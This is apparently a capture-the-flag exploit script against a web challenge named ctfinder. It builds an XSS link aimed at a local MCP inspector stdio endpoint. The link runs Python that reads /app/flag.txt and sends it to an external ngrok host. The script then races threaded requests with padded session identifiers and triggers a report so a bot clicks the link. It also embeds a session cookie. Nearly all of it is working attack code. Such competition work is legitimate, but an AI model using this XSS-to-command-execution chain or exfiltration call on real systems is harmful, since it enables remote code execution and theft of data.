xss = """
z<a id='checkReportBtn-___REPORT_ID___' href='http://localhost:6277/stdio?command=python&args=-c+%27__builtins__.__import__%28%22urllib.request%22%29.request.urlopen%28%22http%3A%2F%2F5.tcp.eu.ngrok.io%3A16118%2F%3Fflag%3D%22%2Bopen%28%22%2Fapp%2Fflag.txt%22%29.read%28%29%29%27&env=%7B%22HOME%22%3A%22%2Fhome%2Fmcpuser%22%2C%22PATH%22%3A%22%2Ftmp%2F.npm-cache%2F_npx%2F1d40d075a5198d81%2Fnode_modules%2F.bin%3A%2Fapp%2Fnode_modules%2F.bin%3A%2Fnode_modules%2F.bin%3A%2Fusr%2Flib%2Fnode_modules%2Fnpm%2Fnode_modules%2F%40npmcli%2Frun-script%2Flib%2Fnode-gyp-bin%3A%2Fusr%2Flocal%2Fbin%3A%2Fusr%2Flocal%2Fsbin%3A%2Fusr%2Flocal%2Fbin%3A%2Fusr%2Fsbin%3A%2Fusr%2Fbin%3A%2Fsbin%3A%2Fbin%22%7D&transportType=stdio'>click me</a>
"""

import requests


#HTTP_MAIN = "https://ctfinder-a67a6f6cc4d0b281.instancer.idek.team"
#HTTP_MAIN = "http://192.168.48.5:1337"
HTTP_MAIN = "https://ctfinder-288f6ca7275c832e.instancer.idek.team"

def req(msg,sess_id,cookie_session):


    resp = requests.post(f"{HTTP_MAIN}/sessions/{sess_id}/messages", headers={"Content-Type":"application/json"},json={"content":msg},cookies={"session":cookie_session})

    print(sess_id, resp.text)


def req2(msg,sess_id,cookie_session):


    resp = requests.get(f"{HTTP_MAIN}/sessions/{sess_id}/report", cookies={"session":cookie_session})

    print(sess_id, resp.text)

import _thread
import time
if __name__ == "__main__":

    sess_id = "0d4eebba-db68-4b48-a3d2-9545e60258fc"
    user_id = "d854fa46-e500-4889-b6ff-2b6c67891254"

    userlen = len(f"{user_id}:")

    # key = f"{session_id}:{user_id}:{nonce}:{timestamp}"

    # 1 session_id = {session_id}:{user_id}
    # 2 nonce = {user_id}:{nonce}
    
    cookie_session = "eyJpc19hZG1pbiI6MCwidXNlcl9pZCI6ImQ4NTRmYTQ2LWU1MDAtNDg4OS1iNmZmLTJiNmM2Nzg5MTI1NCIsInVzZXJuYW1lIjoid3d3dyJ9.aI-m6w.7k0SZzHYRau8L2Q1LkqHCOO1Owc"

    reportID = "46580a7"

    xss = xss.replace("___REPORT_ID___",reportID)


    _thread.start_new_thread(req,(f"{"A"*(128-userlen)}",f"{sess_id}:{user_id}", cookie_session))
    time.sleep(0.1)
    _thread.start_new_thread(req,(f"{user_id}:{"A"*(128-userlen)} {xss}",sess_id, cookie_session))
    time.sleep(3)
    _thread.start_new_thread(req2,(f"-",f"{sess_id}:{user_id}", cookie_session))
    time.sleep(0.1)
    _thread.start_new_thread(req2,(f"-",sess_id, cookie_session))


    time.sleep(10)
